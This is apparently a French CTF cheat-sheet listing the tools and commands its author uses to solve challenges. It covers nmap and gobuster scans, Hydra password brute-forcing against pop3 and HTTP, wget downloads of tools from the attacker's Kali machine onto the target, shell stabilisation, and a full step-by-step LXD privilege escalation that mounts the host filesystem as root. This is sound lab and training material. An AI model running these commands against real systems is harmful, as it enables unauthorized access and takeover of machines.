---
description: Outils utilisés dans la résolution des challenges.
---

# Outils

## 1. nmap

```shell-session
nmap $IP -A -p- -oN nmap.txt -T4
```

## 2. gobuster

```shell-session
gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x ".php,.html,.txt,.zip" -u $IP -t50
```

```
gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x ".php,.html,.txt,.zip" -u http://$IP:8080 -t50 -U <user> -P <password>
```



## 3. Hydra

* Hydra pour pop3

```
hydra -l <user>  -P /usr/share/wordlists/rockyou.txt pop3://$IP -s <port> -t 64
```

ou

```
hydra -l <user>  -P /usr/share/wordlists/fasttrack.txt pop3://$IP -s <port> -t 64 
```

* Hydra pour http-get

```
hydra -l <user> -P /usr/share/wordlists/rockyou.txt $IP -s <port> http-get
```

## 4. Transfert de fichiers

Pour transférer des fichiers depuis la machine Kali vers la machine cible:

1. sur la machine Kali
   1. aller dans le répertoire contenant les fichiers à transférer
   2. `python3 -m http.server`
2. sur la machine cible
   1. aller dans le répertoire /dev/shm
   2. `wget < kali tun0 IP>:8000/fichier.à.transférer`
   3. rendre les fichiers exécutables avec `chmod +x`

## 5. Privilege Escalation

Voici la méthode générique que j'utilise pour trouver les possibilités de 'privilege escalation'. Cette méthode est en partie basée sur l'article Linux [Privilege Escalation: Automated Script](https://www.hackingarticles.in/linux-privilege-escalation-automated-script/).

1. sudo -l
2. [suid3num.py](https://github.com/Anon-Exploiter/SUID3NUM/tree/master)
3. [les.sh](https://github.com/The-Z-Labs/linux-exploit-suggester)
4. [linpeas.sh](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS)

## 6. Consolidation d'un Shell

```shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
ctrl Z
stty raw -echo; fg
export TERM=xterm  
(stty cols 132 rows 34)
```

## 7. Escalade de privilèges via LXD

Basé sur cet article: [LXC/LXD (Linux Container/Daemon) Privilege Escalation](https://exploit-notes.hdks.org/exploit/linux/container/lxc-lxd-privilege-escalation/)

Vérifiez que l'utilisateur sur la machine cible fait partie du groupe lxd

```shell
id
uid=33(www-data) gid=33(www-data) groups=33(www-data),115(lxd)
```

### 7.1 Sur la machine Kali

Préparez un conteneur linux et lancer un serveur http

```
git clone  https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
sudo ./build-alpine
python3 -m http.server 8000
```

### 7.2 Sur la machine cible

Téléchargez le fichier \<alpine tar.gz> et importez-le comme image dans LXC

```
cd /dev/shm
wget http://<local-ip>:8000/<alpine tar.gz>
lxc image import ./<alpine tar.gz> --alias myimage
lxc image list
```

Créez un nouveau conteneur '**mycontainer**' basé sur l'image '**myimage**' qui vient d'être importée.

```
lxc init myimage mycontainer -c security.privileged=true
```

En cas de message **“**&#x4E;o storage pool found. Please create a new storage poo&#x6C;**.”** initialisez LXD d'abord et relancez la commande.

```
lxd init
```

Montez (mount) le répertoire principal / dans le répertoire /mnt/root du conteneur 'mycontainer' que vous venez de créer

```
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
```

Démarrez votre conteneur

```
lxc start mycontainer
```

Lancez un Shell (note: l'image Alpine ne supporte qu'un shell sh)

```
lxc exec mycontainer /bin/sh
```

Vérifiez que vous êtes bien root

```
whoami
```

Rendez-vous dans le répertoire principal de la machine cible monté en /mnt/root et accédez en tant que root à toutes les données de la machine

```
cd /mnt/root

```

### 8. Outils Stéganographie

Voici un lien vers une liste d'outils de stéganographie que j'utilise souvent

[https://medium.com/@ria.banerjee005/steganography-tools-techniques-bba3f95c7148](https://medium.com/@ria.banerjee005/steganography-tools-techniques-bba3f95c7148)

On y retrouve notamment **strings**, **steghide**, **stegseek** et autres **exiftools**
